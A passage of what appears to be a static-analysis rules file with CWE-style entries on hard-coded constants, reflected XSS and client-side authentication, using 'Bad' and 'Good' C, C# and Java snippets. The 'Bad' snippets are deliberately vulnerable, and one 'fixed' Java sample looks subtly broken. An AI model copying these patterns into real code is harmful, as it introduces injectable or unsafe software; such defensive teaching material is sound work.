&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The program uses hard-coded constants instead of symbolic names
for security-critical values, which increases the likelihood of mistakes during
code maintenance or security policy change.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;If the developer does not find all occurrences of the hard-coded
constants, an incorrect policy decision may be made if one of the constants
is not changed. Making changes to these values will require code changes
that may be difficult or impossible once the system is released to the
field. In addition, these hard-coded values may become available to
attackers if the code is ever disclosed.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_547_Time of Introduction" id="oc_547_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_547_Demonstrative Examples" id="oc_547_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The usage of symbolic names instead of hard-coded constants is
preferred.&lt;/p&gt;&lt;p&gt;The following is an example of using a hard-coded constant instead of
a symbolic name.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example Languages: &lt;/span&gt;C and C++&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;char buffer[1024];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;fgets(buffer, 1024, stdin);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;If the buffer value needs to be changed, then it has to be altered in
more than one place. If the developer forgets or does not find all
occurences, in this example it could lead to a buffer overflow.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example Languages: &lt;/span&gt;C and C++&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;enum { MAX_BUFFER_SIZE = 1024 };&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;char buffer[MAX_BUFFER_SIZE];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;fgets(buffer, MAX_BUFFER_SIZE, stdin);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;In this example the developer will only need to change one value and
all references to the buffer size are updated, as a symbolic name is
used instead of a hard-coded constant.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_547_Potential Mitigations" id="oc_547_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Avoid using hard-coded constants. Configuration files offer a more
flexible solution.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_547_Relationships" id="oc_547_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;398&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=398" target="_blank"&gt;Indicator of Poor Code Quality&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;736&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=736" target="_blank"&gt;CERT C Secure Coding Section 02 - Declarations and Initialization (DCL)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Addressed by the CERT C Secure Coding Standard &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;734&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_547_Taxonomy Mappings" id="oc_547_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CERT C Secure Coding&lt;/td&gt;&lt;td valign="top"&gt;DCL06-C&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Use meaningful symbolic constants to represent literal values
in program logic&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_547_Content History" id="oc_547_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-11-24&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Potential Mitigations, Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Security-relevant
Constants&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1061</key><name>Potential_IO_Reflected_XSS_All_Clients</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1667</key><name>Use_of_Client_Side_Authentication</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Use of Client-Side Authentication&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;603&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_603_Description" id="oc_603_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;A client/server product performs authentication within client
code but not in server code, allowing server-side authentication to be bypassed
via a modified client that omits the authentication check.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Client-side authentication is extremely weak and may be breached easily.
Any attacker may read the source code and reverse-engineer the
authentication mechanism to access parts of the application which would
otherwise be protected.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_603_Time of Introduction" id="oc_603_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_603_Observed Examples" id="oc_603_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0230" target="_blank"&gt;CVE-2006-0230&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Client-side check for a password allows access to
a server using crafted XML requests from a modified
client.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_603_Potential Mitigations" id="oc_603_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Do not rely on client side data. Always perform server side
authentication.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_603_Other Notes" id="oc_603_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Note that there is a close relationship between this weakness and CWE-656
(Reliance on Security through Obscurity). If developers do not believe that
a user can reverse engineer a client, then they are more likely to choose
client-side authentication in the belief that it is safe.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_603_Relationships" id="oc_603_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;287&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=287" target="_blank"&gt;Improper Authentication&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;602&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=602" target="_blank"&gt;Client-Side Enforcement of Server-Side Security&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;300&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=300" target="_blank"&gt;Channel Accessible by Non-Endpoint ('Man-in-the-Middle')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;592&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=592" target="_blank"&gt;Authentication Bypass Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_603_Content History" id="oc_603_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Anonymous Tool Vendor (under NDA)&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" 